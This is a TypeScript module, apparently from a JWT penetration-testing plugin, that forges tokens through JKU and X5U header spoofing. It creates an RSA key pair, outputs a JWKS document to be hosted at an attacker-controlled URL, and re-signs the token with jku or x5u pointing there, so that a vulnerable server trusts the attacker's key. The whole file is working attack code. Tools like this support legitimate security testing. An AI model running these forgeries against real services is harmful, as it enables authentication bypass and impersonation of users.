/**
 * JKU / X5U Spoofing Attacks (a.k.a. JWKS Injection via attacker-hosted keys)
 *
 * jku (JSON Web Key Set URL): Attacker sets the jku header to a URL they control
 *   hosting a JWKS containing their own public key, then re-signs with the
 *   corresponding private key.
 *
 * x5u (X.509 URL): Same idea via the x5u header pointing to a certificate.
 *
 * A fresh RSA key pair is generated automatically when no key pair is configured
 * in plugin settings. The user must host the emitted JWKS document at the
 * configured jwksUrl for the server to fetch it.
 */

import { signRSA } from "../crypto/jwt.js";
import { generateRSAKeyPair, buildJWKSDocument, publicKey2jwk, type RSAKeyPair } from "../crypto/rsa.js";
import type { ParsedJWT, AttackResult, PluginConfig, JWK } from "../types.js";
import { nanoid } from "../util.js";

export function buildJKUSpoofAttacks(
  parsed: ParsedJWT,
  config: PluginConfig,
  rsaKeyPair?: RSAKeyPair
): { attacks: AttackResult[]; jwksContent: string | null; jwksKey: string | null } {
  const results: AttackResult[] = [];

  if (!config.jwksUrl) {
    return { attacks: [], jwksContent: null, jwksKey: null };
  }

  const kid = "jwt-attacker-spoof-key";

  // Resolve the key material: prefer a configured key pair, otherwise generate.
  let privateKeyPem: string;
  let publicJwk: JWK;

  if (config.customPrivateKeyPem && config.customPublicKeyPem) {
    privateKeyPem = config.customPrivateKeyPem;
    publicJwk = publicKey2jwk(config.customPublicKeyPem);
  } else {
    const kp = rsaKeyPair ?? generateRSAKeyPair(2048);
    privateKeyPem = kp.privateKeyPem;
    publicJwk = kp.publicJwk;
  }

  const jwks = buildJWKSDocument({ ...publicJwk, kid }, kid);
  const jwksContent = JSON.stringify(jwks, null, 2);
  const jwksKey = privateKeyPem;

  const sign = (extraHeader: Record<string, unknown>): string => {
    const header = {
      ...parsed.header,
      alg: "RS256",
      kid,
      jwk: undefined,
      jku: undefined,
      x5u: undefined,
      x5c: undefined,
      ...extraHeader,
    };
    return signRSA(header as Parameters<typeof signRSA>[0], parsed.payload, privateKeyPem, "RS256");
  };

  // JKU attack
  try {
    results.push({
      id: nanoid(),
      technique: "jkuSpoof",
      techniqueName: "JKU Spoofing (RS256)",
      description:
        `Sets the jku header to ${config.jwksUrl} and signs with the generated private key. ` +
        "The server must be able to reach your JWKS endpoint. " +
        "Host the generated JWKS JSON at that URL before sending this request.",
      modifiedJWT: sign({ jku: config.jwksUrl }),
      timestamp: Date.now(),
    });
  } catch { /* ignore */ }

  // X5U attack (same key, x5u header instead)
  try {
    results.push({
      id: nanoid(),
      technique: "x5uSpoof",
      techniqueName: "X5U Spoofing (RS256)",
      description:
        `Sets the x5u header to ${config.jwksUrl} and signs with the generated private key. ` +
        "Host the generated certificate / key at that URL.",
      modifiedJWT: sign({ x5u: config.jwksUrl }),
      timestamp: Date.now(),
    });
  } catch { /* ignore */ }

  return { attacks: results, jwksContent, jwksKey };
}
